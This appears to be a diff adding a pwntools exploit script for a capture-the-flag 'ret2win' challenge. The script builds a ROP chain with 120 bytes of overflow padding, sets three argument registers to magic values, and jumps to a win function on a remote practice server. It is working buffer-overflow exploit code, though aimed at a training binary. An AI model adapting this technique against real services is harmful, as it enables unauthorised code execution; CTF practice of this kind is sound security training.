@@ -1,0 +1,15 @@
+from pwn import *
+elf = context.binary = ELF("./ret2win")
+rop = ROP(elf)
+# p = process()
+p = remote("playground.tcp1p.team",19001)
+offset = 120
+rop.raw(b"A" * offset)
+rop.rdi = p64(0xdeadbeefdeadbeef)
+rop.rsi = p64(0xabcd1234dcba4321)
+rop.rdx = p64(0x147147147147147)
+rop.raw(rop.find_gadget(['ret'])[0])
+rop.raw(p64(0x0000000000401227))
+rop.raw(p64(0x0))
+p.sendline(rop.chain())
+print(p.recvall())
